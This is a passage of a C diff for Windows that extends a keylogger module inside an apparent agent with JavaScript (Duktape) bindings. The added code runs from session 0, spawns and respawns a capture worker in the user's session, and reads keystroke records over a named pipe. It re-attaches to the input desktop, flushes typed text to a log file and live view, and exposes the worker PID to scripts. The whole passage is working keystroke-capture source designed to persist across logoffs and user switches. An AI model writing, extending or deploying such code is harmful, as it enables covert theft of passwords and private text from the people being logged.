+    }
+    else
+    {
+        Keylog_Dbg("hook: installed ok (agent session %lu)", (unsigned long)sess);
+    }
+    if (session0)
+    {
+        Keylog_WorkerSpawn(kl);
+        lastSpawn = GetTickCount();
+    }
+
     while (WaitForSingleObject(kl->stopEvent, 50) != WAIT_OBJECT_0)
     {
+        DWORD now = GetTickCount();
+        if (session0)
+        {
+            if (kl->workerProc == NULL)
+            {
+                /* No worker (logoff or not spawned yet): retry with backoff. */
+                if ((now - lastSpawn) >= KEYLOG_SPAWN_RETRY_MS)
+                {
+                    lastSpawn = now;
+                    Keylog_WorkerSpawn(kl);
+                }
+            }
+            else if (WaitForSingleObject(kl->workerProc, 0) == WAIT_OBJECT_0)
+            {
+                /* Worker exited (user logged off, user switch, crash). */
+                Keylog_Dbg("worker: exited, will respawn");
+                CloseHandle(kl->workerProc);
+                kl->workerProc = NULL;
+                kl->workerPid = 0;
+                if (kl->pipeRead != NULL) { CloseHandle(kl->pipeRead); kl->pipeRead = NULL; }
+                lastSpawn = 0;
+            }
+            else if (kl->pipeRead != NULL)
+            {
+                DWORD avail = 0;
+                if (PeekNamedPipe(kl->pipeRead, NULL, 0, NULL, &avail, NULL) == FALSE)
+                {
+                    if (GetLastError() == ERROR_BROKEN_PIPE)
+                    {
+                        Keylog_Dbg("worker: pipe broken");
+                        CloseHandle(kl->pipeRead);
+                        kl->pipeRead = NULL;
+                    }
+                }
+                else if (avail >= KEYLOG_PIPE_RECORD)
+                {
+                    unsigned char rec[KEYLOG_PIPE_RECORD];
+                    DWORD wr = 0;
+                    if (ReadFile(kl->pipeRead, rec, sizeof(rec), &wr, NULL) != FALSE && wr == (DWORD)sizeof(rec))
+                    {
+                        unsigned short kc = (unsigned short)(rec[0] | ((unsigned short)rec[1] << 8));
+                        /* Record layout: 2-byte little-endian key count,
+                         * then the line text. */
+                        rec[sizeof(rec) - 1] = 0;
+                        if (kc != 0)
+                        {
+                            EnterCriticalSection(&g_kl.cs);
+                            g_kl.totalKeys += kc;
+                            LeaveCriticalSection(&g_kl.cs);
+                        }
+                        Keylog_StoreLine((const char*)(rec + 2));
+                    }
+                    else
+                    {
+                        Keylog_Dbg("worker: pipe read failed err=%lu", (unsigned long)GetLastError());
+                        CloseHandle(kl->pipeRead);
+                        kl->pipeRead = NULL;
+                    }
+                }
+            }
+        }
+        if ((now - lastTick) >= KEYLOG_FMT_TICK_MS)
+        {
+            lastTick = now;
+            /* Flush text that has been sitting in the buffer (idle typing)
+             * so the log file and the live view stay current. */
+            KeylogEmit e[2];
+            int n = Keylog_FormatTick(e);
+            int i;
+            for (i = 0; i < n; i++)
+            {
+                if (e[i].keys != 0)
+                {
+                    EnterCriticalSection(&g_kl.cs);
+                    g_kl.totalKeys += e[i].keys;
+                    LeaveCriticalSection(&g_kl.cs);
+                }
+                Keylog_StoreLine(e[i].text);
+            }
+        }
+        if ((now - lastAttach) >= 2000)
+        {
+            lastAttach = now;
+            Keylog_AttachToInputDesktop();
+        }
         while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE) != FALSE)
         {
             TranslateMessage(&msg);
@@ -450,6 +1145,23 @@ static DWORD WINAPI Keylog_ThreadProc(LPVOID param)
         }
     }
     if (hook != NULL) { UnhookWindowsHookEx(hook); }
+    {
+        /* Last chance to flush any pending text before the hook goes away. */
+        KeylogEmit e[2];
+        int n = Keylog_FormatFlushAll(e);
+        int i;
+        for (i = 0; i < n; i++)
+        {
+            if (e[i].keys != 0)
+            {
+                EnterCriticalSection(&g_kl.cs);
+                g_kl.totalKeys += e[i].keys;
+                LeaveCriticalSection(&g_kl.cs);
+            }
+            Keylog_StoreLine(e[i].text);
+        }
+    }
+    Keylog_WorkerClean(kl);
     return 0;
 }
 
@@ -473,6 +1185,22 @@ static void Keylog_StopInternal(void)
         WaitForSingleObject(g_kl.thread, KEYLOG_STOP_WAIT_MS);
         CloseHandle(g_kl.thread);
         g_kl.thread = NULL;
+    }
+    {
+        /* Safety net in case the thread was killed before its own flush. */
+        KeylogEmit e[2];
+        int n = Keylog_FormatFlushAll(e);
+        int i;
+        for (i = 0; i < n; i++)
+        {
+            if (e[i].keys != 0)
+            {
+                EnterCriticalSection(&g_kl.cs);
+                g_kl.totalKeys += e[i].keys;
+                LeaveCriticalSection(&g_kl.cs);
+            }
+            Keylog_StoreLine(e[i].text);
+        }
     }
     EnterCriticalSection(&g_kl.cs);
     Keylog_CloseCurrent();
@@ -498,6 +1226,7 @@ static duk_ret_t Keylog_Start(duk_context *ctx)
 
     Keylog_EnsureInit();
     Keylog_StopInternal();
+    Keylog_FmtReset();
     logDirBuf[0] = 0;
 
     if (duk_is_object(ctx, 0))
@@ -600,6 +1329,15 @@ static duk_ret_t Keylog_GetState(duk_context *ctx)
     duk_put_prop_string(ctx, -2, "maxFileSize");
     duk_push_string(ctx, g_kl.lastError);
     duk_put_prop_string(ctx, -2, "lastError");
+    if (g_kl.workerProc != NULL && WaitForSingleObject(g_kl.workerProc, 0) != WAIT_OBJECT_0)
+    {
+        duk_push_number(ctx, (double)g_kl.workerPid);
+    }
+    else
+    {
+        duk_push_number(ctx, 0.0);
+    }
+    duk_put_prop_string(ctx, -2, "workerPid");
     LeaveCriticalSection(&g_kl.cs);
     return 1;
 }
@@ -617,7 +1355,9 @@ static duk_ret_t Keylog_Read(duk_context *ctx)
     if ((max > 0) && (max < count)) { count = max; }
     for (i = 0; i < count; i++)
     {
-        const KeylogLine *ln = &g_kl.ring[g_kl.ringHead];
+        /* Advance the index per iteration: draining N pending lines must
+         * return the N oldest lines, not N copies of the oldest one. */
+        const KeylogLine *ln = &g_kl.ring[(g_kl.ringHead + (unsigned int)i) % KEYLOG_RING_LINES];
         duk_push_string(ctx, ln->text);
         duk_put_prop_index(ctx, -2, (duk_uarridx_t)i);
     }
